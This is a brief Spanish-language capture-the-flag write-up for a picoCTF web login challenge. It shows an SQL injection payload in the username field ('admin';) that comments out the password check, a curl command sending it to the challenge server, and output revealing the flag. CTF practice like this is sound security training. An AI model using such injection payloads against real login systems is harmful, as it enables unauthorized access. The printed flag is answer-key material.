## Objetivo

There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649
## Solución

Utilizamos una injeccion SQL diferente, ya que solamente en la parte de la contraseña estaba filtrada

username: admin';
password: admin
SQL query: SELECT * FROM users WHERE name='admin';' AND password='admin'

por consola
```
czarragar-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin';&password=admin&debug=1"
<pre>username: admin';
password: admin
SQL query: SELECT * FROM users WHERE name='admin';' AND password='admin'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_aee925db}</p>czarragar-picoctf@webshell:~$ 
```

```
picoCTF{m0R3_SQL_plz_aee925db}
```

## Notas adicionales

## Referencias


